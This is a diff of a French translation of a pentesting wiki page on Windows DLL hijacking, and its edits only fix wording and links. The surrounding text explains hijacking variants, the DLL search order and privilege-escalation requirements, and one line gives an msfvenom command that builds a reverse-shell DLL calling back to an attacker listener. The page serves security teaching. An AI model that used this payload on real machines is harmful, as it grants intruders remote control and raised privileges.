@@ -15,7 +15,7 @@ Plusieurs méthodes sont employées pour le DLL hijacking, chacune ayant son eff
 2. **DLL Search Order Hijacking** : Placer le DLL malveillant dans un chemin de recherche avant le légitime, exploitant le modèle de recherche de l'application.
 3. **Phantom DLL Hijacking** : Créer un DLL malveillant pour qu'une application le charge, pensant qu'il s'agit d'un DLL requis non existant.
 4. **DLL Redirection** : Modifier des paramètres de recherche comme `%PATH%` ou des fichiers `.exe.manifest` / `.exe.local` pour diriger l'application vers le DLL malveillant.
-5. **WinSxS DLL Replacement** : Substituer le DLL légitime par un équivalent malveillant dans le répertoire WinSxS, une méthode souvent associée au DLL side-loading.
+5. **WinSxS DLL Replacement** : Substituer le DLL légitime par un équivalent malveillant dans le répertoire WinSxS, une méthode souvent associée au side-loading de DLL.
 6. **Relative Path DLL Hijacking** : Placer le DLL malveillant dans un répertoire contrôlé par l'utilisateur avec l'application copiée, ressemblant aux techniques d'exécution de proxy binaire.
 
 ## Finding missing Dlls
@@ -46,7 +46,7 @@ Pour escalader les privilèges, la meilleure chance que nous avons est de pouvoi
 Vous pouvez voir l'**ordre de recherche des DLL sur les systèmes 32 bits** ci-dessous :
 
 1. Le répertoire à partir duquel l'application a été chargée.
-2. Le répertoire système. Utilisez la fonction [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) pour obtenir le chemin de ce répertoire.(_C:\Windows\System32_)
+2. Le répertoire système. Utilisez la fonction [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) pour obtenir le chemin de ce répertoire. (_C:\Windows\System32_)
 3. Le répertoire système 16 bits. Il n'existe pas de fonction qui obtienne le chemin de ce répertoire, mais il est recherché. (_C:\Windows\System_)
 4. Le répertoire Windows. Utilisez la fonction [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) pour obtenir le chemin de ce répertoire. (_C:\Windows_)
 5. Le répertoire courant.
@@ -73,7 +73,7 @@ Certaines exceptions à l'ordre de recherche standard des DLL sont notées dans 
 **Requirements** :
 
 - Identifier un processus qui fonctionne ou fonctionnera sous **différents privilèges** (mouvement horizontal ou latéral), qui **manque d'un DLL**.
-- Assurez-vous qu'un **accès en écriture** est disponible pour tout **répertoire** dans lequel le **DLL** sera **recherché**. Cet emplacement pourrait être le répertoire de l'exécutable ou un répertoire dans le chemin système.
+- S'assurer qu'un **accès en écriture** est disponible pour tout **répertoire** dans lequel le **DLL** sera **recherché**. Cet emplacement pourrait être le répertoire de l'exécutable ou un répertoire dans le chemin système.
 
 Oui, les exigences sont compliquées à trouver car **par défaut, il est un peu étrange de trouver un exécutable privilégié manquant d'un dll** et c'est encore **plus étrange d'avoir des permissions d'écriture sur un dossier de chemin système** (vous ne pouvez pas par défaut). Mais, dans des environnements mal configurés, cela est possible.\
 Dans le cas où vous avez de la chance et que vous remplissez les exigences, vous pourriez vérifier le projet [UACME](https://github.com/hfiref0x/UACME). Même si le **but principal du projet est de contourner UAC**, vous pourriez y trouver un **PoC** d'un Dll hijacking pour la version de Windows que vous pouvez utiliser (probablement juste en changeant le chemin du dossier où vous avez des permissions d'écriture).
@@ -92,7 +92,7 @@ Vous pouvez également vérifier les imports d'un exécutable et les exports d'u
 dumpbin /imports C:\path\Tools\putty\Putty.exe
 dumpbin /export /path/file.dll
 ```
-Pour un guide complet sur la façon d'**abuser de Dll Hijacking pour élever les privilèges** avec des permissions d'écriture dans un **dossier de chemin système**, consultez :
+Pour un guide complet sur la façon d'**abuser du Dll Hijacking pour élever les privilèges** avec des permissions d'écriture dans un **dossier de chemin système**, consultez :
 
 {{#ref}}
 writable-sys-path-+dll-hijacking-privesc.md
@@ -105,12 +105,12 @@ D'autres outils automatisés intéressants pour découvrir cette vulnérabilité
 
 ### Exemple
 
-Dans le cas où vous trouvez un scénario exploitable, l'une des choses les plus importantes pour réussir à l'exploiter serait de **créer un dll qui exporte au moins toutes les fonctions que l'exécutable importera de celui-ci**. Quoi qu'il en soit, notez que Dll Hijacking est utile pour [escalader du niveau d'intégrité moyen au niveau élevé **(en contournant UAC)**](../../authentication-credentials-uac-and-efs/#uac) ou de [**l'intégrité élevée au SYSTÈME**](../#from-high-integrity-to-system)**.** Vous pouvez trouver un exemple de **comment créer un dll valide** dans cette étude de dll hijacking axée sur le dll hijacking pour l'exécution : [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
+Dans le cas où vous trouvez un scénario exploitable, l'une des choses les plus importantes pour réussir à l'exploiter serait de **créer un dll qui exporte au moins toutes les fonctions que l'exécutable importera de celui-ci**. Quoi qu'il en soit, notez que le Dll Hijacking est utile pour [escalader du niveau d'intégrité moyen au niveau élevé **(en contournant UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou de [**l'intégrité élevée au SYSTÈME**](../index.html#from-high-integrity-to-system)**.** Vous pouvez trouver un exemple de **comment créer un dll valide** dans cette étude sur le dll hijacking axée sur le dll hijacking pour l'exécution : [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
 De plus, dans la **section suivante**, vous pouvez trouver quelques **codes dll de base** qui pourraient être utiles comme **modèles** ou pour créer un **dll avec des fonctions non requises exportées**.
 
 ## **Création et compilation de Dlls**
 
-### **Dll Proxifying**
+### **Proxy Dll**
 
 Fondamentalement, un **proxy Dll** est un Dll capable d'**exécuter votre code malveillant lorsqu'il est chargé** mais aussi d'**exposer** et de **fonctionner** comme **prévu** en **relayant tous les appels à la véritable bibliothèque**.
 
@@ -118,7 +118,7 @@ Avec l'outil [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 
 
 ### **Meterpreter**
 
-**Obtenir un shell rev (x64) :**
+**Obtenir un shell inversé (x64) :**
 ```bash
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
